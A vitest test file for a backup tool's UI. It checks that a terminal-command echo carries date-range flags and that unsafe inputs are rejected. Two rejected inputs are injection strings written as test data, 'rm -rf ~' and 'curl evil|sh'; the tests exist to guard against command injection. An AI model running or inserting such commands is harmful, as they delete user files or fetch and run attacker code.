/**
 * Issue #1251: the Backups page's "Same list from the terminal" line has to
 * print the list the screen shows. With a received-date range set, that is
 * `retnd artifacts --backup-set S --since A --until B`, the same inclusive
 * calendar-day bounds the two date inputs apply (backupSelection.ts
 * inReceivedRange). A range the CLI would refuse, or bounds it cannot spell,
 * get no line at all rather than one that lists something else.
 */
import { describe, expect, it } from "vitest";
import { setFilterEcho } from "./backupRowMenu";
import { artifactsInSetCommand } from "@shared/assurance/assuranceCommands";

// Raw text through Vite, because tsconfig keeps @types/node out of this program.
import cliMain from "../../../../core/cmd/retnd/main.go?raw";

const SET = "production/billing-mysql";
const KNOWN = [{ id: SET }];

describe("#1251 the set filter's terminal line carries the received-date range", () => {
  it("#1251 with no dates it is the set alone, as before", () => {
    expect(setFilterEcho(SET, KNOWN)).toBe("retnd artifacts --backup-set " + SET);
    expect(setFilterEcho(SET, KNOWN, "", "")).toBe("retnd artifacts --backup-set " + SET);
  });

  it("#1251 the on-or-after date is --since", () => {
    expect(setFilterEcho(SET, KNOWN, "2026-08-20", "")).toBe("retnd artifacts --backup-set " + SET + " --since 2026-08-20");
  });

  it("#1251 the on-or-before date is --until", () => {
    expect(setFilterEcho(SET, KNOWN, "", "2026-08-24")).toBe("retnd artifacts --backup-set " + SET + " --until 2026-08-24");
  });

  it("#1251 both dates go in, since first", () => {
    expect(setFilterEcho(SET, KNOWN, "2026-08-20", "2026-08-24")).toBe("retnd artifacts --backup-set " + SET + " --since 2026-08-20 --until 2026-08-24");
  });

  it("#1251 one day is both bounds on the same date", () => {
    expect(setFilterEcho(SET, KNOWN, "2026-08-22", "2026-08-22")).toBe("retnd artifacts --backup-set " + SET + " --since 2026-08-22 --until 2026-08-22");
  });

  it("#1251 a removed set's id still echoes with its range", () => {
    expect(setFilterEcho("production/legacy-redis", KNOWN, "2026-08-01", "")).toBe("retnd artifacts --backup-set production/legacy-redis --since 2026-08-01");
  });

  it("#1251 an inverted range has no line, because the CLI refuses --until before --since", () => {
    expect(setFilterEcho(SET, KNOWN, "2026-08-24", "2026-08-20")).toBeNull();
  });

  it("#1251 a bound that is not a calendar date has no line, rather than one that lists more", () => {
    expect(setFilterEcho(SET, KNOWN, "20th August", "")).toBeNull();
    expect(setFilterEcho(SET, KNOWN, "", "2026-08-24; rm -rf ~")).toBeNull();
  });

  it("#1251 a value the set filter would not echo stays unechoed with dates too", () => {
    expect(setFilterEcho("x;curl evil|sh", KNOWN, "2026-08-20", "2026-08-24")).toBeNull();
    expect(setFilterEcho("", KNOWN, "2026-08-20", "2026-08-24")).toBeNull();
  });

  it("#1251 the builder takes the range", () => {
    expect(artifactsInSetCommand(SET, { since: "2026-08-20", until: "2026-08-24" })).toBe("retnd artifacts --backup-set " + SET + " --since 2026-08-20 --until 2026-08-24");
    expect(artifactsInSetCommand(SET, { since: "", until: "" })).toBe("retnd artifacts --backup-set " + SET);
  });
});

describe("#1251 the flags the line prints are ones the CLI has", () => {
  it("#1251 the artifacts synopsis offers --since DATE and --until DATE", () => {
    expect(cliMain).toMatch(/\n {2}artifacts \[--source S\] \[--backup-set B\][^\n]*\[--since DATE\] \[--until DATE\]/);
  });
  it("#1251 the recover --set synopsis offers --until DATE", () => {
    expect(cliMain).toMatch(/\n {2}recover --set <source\/backup-set> [^\n]*--until DATE/);
  });
});
